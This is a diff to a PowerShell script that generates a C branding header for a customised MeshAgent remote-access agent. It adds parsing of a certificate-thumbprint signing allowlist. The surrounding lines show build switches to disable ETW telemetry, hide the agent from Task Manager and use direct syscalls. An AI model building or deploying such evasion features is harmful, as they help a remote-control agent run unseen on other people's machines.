@@ -29,6 +29,46 @@ if (-not (Test-Path $ConfigPath)) {
 Write-Host "[INFO] Reading config: $ConfigPath" -ForegroundColor Yellow
 $config = Get-Content $ConfigPath -Raw | ConvertFrom-Json
 
+# Normalise allowlist entries
+$allowedThumbprints = @()
+if ($config.security -and $config.security.allowedSigners) {
+    foreach ($entry in $config.security.allowedSigners) {
+        if ($null -eq $entry.thumbprint) { continue }
+        $normalized = ($entry.thumbprint -replace '[^0-9a-fA-F]', '').ToUpperInvariant()
+        if ($normalized.Length -ne 40) {
+            Write-Host "[WARN] Skipping invalid thumbprint '$($entry.thumbprint)'; expected 40 hex characters." -ForegroundColor Yellow
+            continue
+        }
+        $allowedThumbprints += $normalized
+    }
+}
+
+function Convert-ThumbprintsToMacro {
+    param([string[]]$Thumbprints)
+
+    if (-not $Thumbprints -or $Thumbprints.Count -eq 0) {
+        return @{
+            Count = 0
+            Macro = $null
+        }
+    }
+
+    $arrayEntries = @()
+    foreach ($thumb in $Thumbprints) {
+        $bytes = @()
+        for ($i = 0; $i -lt $thumb.Length; $i += 2) {
+            $bytes += ("0x{0}" -f $thumb.Substring($i, 2))
+        }
+        $arrayEntries += ("{ " + ($bytes -join ", ") + " }")
+    }
+
+    return @{
+        Count = $Thumbprints.Count
+        Macro = "{ " + ($arrayEntries -join ", ") + " }"
+    }
+}
+
+$allowlistMacro = Convert-ThumbprintsToMacro -Thumbprints $allowedThumbprints
 # Extract values
 $branding = $config.branding
 $network = $config.network
@@ -82,6 +122,21 @@ $originalFilename = if ($versionInfo.originalFilename) { $versionInfo.originalFi
 
 # Generate branding header
 Write-Host "[INFO] Generating branding header: $OutputHeader" -ForegroundColor Yellow
+
+$allowlistCount = $allowlistMacro.Count
+$allowlistBlock = if ($allowlistMacro.Macro) {
+@"
+#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
+#define MESH_AGENT_ALLOWED_SIGNERS_COUNT $allowlistCount
+#undef MESH_AGENT_ALLOWED_SIGNERS
+#define MESH_AGENT_ALLOWED_SIGNERS $($allowlistMacro.Macro)
+"@
+} else {
+@"
+#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
+#define MESH_AGENT_ALLOWED_SIGNERS_COUNT 0
+"@
+}
 
 $headerContent = @"
 /* Generated file - do not edit. */
@@ -165,6 +220,9 @@ $headerContent = @"
 #define MESH_AGENT_DISABLE_ETW $($evasion.disableETW ? 1 : 0)
 #define MESH_AGENT_HIDE_TASKMANAGER $($evasion.hideFromTaskManager ? 1 : 0)
 #define MESH_AGENT_USE_SYSCALLS $($evasion.useSyscalls ? 1 : 0)
+
+/* ========== Signing Allowlist ========== */
+$allowlistBlock
 
 #endif /* GENERATED_MESHAGENT_BRANDING_H */
 "@
